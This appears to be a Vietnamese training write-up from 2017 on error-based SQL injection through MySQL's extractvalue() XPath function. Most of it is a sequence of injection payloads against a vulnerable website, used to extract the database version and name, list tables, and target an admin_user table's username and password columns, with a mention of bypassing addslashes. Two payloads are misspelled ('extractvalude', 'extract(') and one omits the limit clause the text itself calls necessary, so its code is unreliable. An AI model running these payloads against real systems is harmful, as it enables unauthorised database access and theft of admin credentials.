# Task 26

> Tên tài liệu: Error Based Injection using XPath.

> Thực hiện: Nguyễn Minh Nhật

> Cập nhật lần cuối: 11/03/2017

## Mục lục:

[1.Báo cáo chi tiết về lỗi này.](#baocao)

[2.Các ví dụ thực hành lỗi.](#vidu)

## Nội dung.

<a name="baocao"></a>

### 1. Báo cáo chi tiết về lỗi này.

- Trong 1 vài trường hợp ta khai thác bình thường nhưng khi ta `UNION SELECT` để tìm ra cột lỗi để khai thác thông tin trên các cột lỗi đó thì trình duyệt không trả về bất cứ hiển thị nào cho ta biết các cột lỗi.

- Vì thế trong trường hợp này ta có thể sử dung `XPath`.

- Đầu tiên ta tìm hiểu cách hoạt động của hàm `Extractvalue` và cách sử dụng hàm này để khai thác.

- Hàm `Extractvalue()` nhận vào 2 đầu vào như sau : `Extractvalue('XML_data','XPath_query')`

- Hàm này hoạt động khi 1 câu truy vấn `XPath` sai thì nó sẽ báo lỗi như sau:

<img src="http://sv1.upsieutoc.com/2017/03/11/187b40.png"/>

<a name="vidu"></a>

### 2.Các ví dụ thực hành lỗi.

- Ta có 1 web site lỗi như sau:

<img src="http://sv1.upsieutoc.com/2017/03/11/155900.png"></a>

B1: Ta sử dụng hàm `extractvalue()` để khai thác `version()` của web bằng cách tim vào đoạn code sau: `and extractvalude(null,concat(0x3a,version()))`

- Hàm nhận vào câu truy vấn XPath trong trường hợp này ta cố tình làm câu truy vấn sai và tim vào đó code để ta lấy thông tin cần thiết ở đây là `version()`, và ta thu được kết quả như hình.

<img src="http://sv1.upsieutoc.com/2017/03/11/1302c8.png"></a>

B2: Ta tiến hành khai thác các thông tin cần thiết:

**Lấy tên database**: `extractvalue(null,concat(0x3a,database()))`.

- Lấy được tên database như hình.

<img src="http://sv1.upsieutoc.com/2017/03/11/16b3e7.png"></a>

**Lấy các table trong database**: `extractvalue(null,concat(0x3a,(select table_name from information_schema.tables where table_schema = database() limit 0,1)))`

- Vì không thể lấy dữ liệu là 1 danh sách dài được nên ta sử dụng `limit` để xem tên từng table.

- Có nhiều table ta quan tâm table `admin_user`.

<img src="http://sv1.upsieutoc.com/2017/03/11/1acc3c.png"></a>

**Lấy các cột trong table**: `extract(null,concat(0x3a,(select column_name from information_schema.columns where table_schema = database() and table_name='admin_user')))`

- Vì web này mã hóa adslashes nên mình bypass, ta quan tâm đến cột `admin_user_name` và `admin_pass`.

<img src="http://sv1.upsieutoc.com/2017/03/11/182b5d.png"></a>

<img src="http://sv1.upsieutoc.com/2017/03/11/20945a.png"></a>

<img src=""></a>
<img src=""></a>


